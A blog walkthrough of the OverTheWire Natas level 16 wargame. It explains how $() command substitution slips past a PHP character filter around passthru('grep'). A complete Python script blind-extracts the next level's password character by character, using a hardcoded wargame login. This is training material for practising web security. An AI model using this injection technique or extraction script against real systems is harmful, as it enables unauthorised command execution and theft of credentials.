---
title: "Overthewire Natas 16 Walkthrough"
layout: post
date: 2018-05-01 22:44
image: /assets/images/markdown.jpg
headerImage: false
tag:
- ctf
- overthewire
- natas
- wargames
star: true
category: blog
author: Hisham Alshaikh
description: This is just a walkthrough for overthewire's natas level 16
---

## Challenge

![Markdown Image](/assets/images/natas_16_solution/challenge_page.png)

{% highlight php %}
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
{% endhighlight %}


The goal of this level is that we need to bypass the regex filter in order to be able to read the flag in /etc/natas_webpass/natas17. 

## Solution

Reading the source code of the page we can find out that that there is a regex filterzation, and we have to not to use any of the characters in the preg_match() function, so we go the passthru() function to inject and execute a custom command since we have control over the variable $key.

We can use $() in order to inject our commands to the passthru() function, since none of the characters of $() exists in preg_match() filter.

so the final command after injection will look like the following:
{% highlight shell %}
grep -i $(grep /etc/natas_webpass/natas17) dictionary.txt
{% endhighlight %}

We can mimic the same scienario in our local termianl, so we have a better understanding of the situation and how we are gonna solve this challenge. 

Mimicing the challenge, I am going to make some files

flag.txt content
{% highlight raw %}
dGhpc2lzYXRlc3Rtb3RoZXJmdWNrZXJ5b29tYW1hYWFuCg==
{% endhighlight %}

So if we use the following command
{% highlight shell %}
grep -i $(grep ^d /tmp/flag.txt) /etc/passwd
{% endhighlight %}

As we can see the string in flag.txt starts with a 'd', so if we use '^' in order to know the characters in order in the flag file. Starting out with 'd' since flag starts with 'd', the commands will return no result; however, if we choose a character other than 'd' the terminal will hang with result return. This way we will be able to figure out the flag content for this challenge, so we can go to the next level.

Here is the complete solution code for this level.


{% highlight python %}
#!/usr/bin/python
#h15h4m

# way better than the other libs
import requests
from requests.auth import HTTPBasicAuth


chars_to_check = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
string_to_find = "Output:\n<pre>\n</pre>"

target = "http://natas16.natas.labs.overthewire.org/"
http_login=HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

password_chars = ''
password = ''

r = requests.get(target , auth=http_login)

if r.status_code != requests.codes.ok:
	print "[-] Unable to access. Check Authentication."
	exit()

print "[!] cool. We are in!"

print "[!] finding password chars...."

#lets find password chars first easier for brute force later
for x in chars_to_check:
	r = requests.get(target + "?needle=$(grep "+ x +" /etc/natas_webpass/natas17)",auth=http_login )	
	if r.content.find(string_to_find) != -1:
		password_chars = password_chars + x
		
print '[+] password chars: '  +   password_chars

print '[!] brut3 f0rc1ng the p455w0rd......'
for x in range(32):
	for xx in password_chars:
		r = requests.get(target + "?needle=$(grep ^"+ password + xx +" /etc/natas_webpass/natas17)",auth=http_login )
		if r.content.find(string_to_find) != -1:
			password += xx
			break
	
print "[+] password: " + password
{% endhighlight %}


Executing the code
![Markdown Image](/assets/images/natas_16_solution/final_result.png)
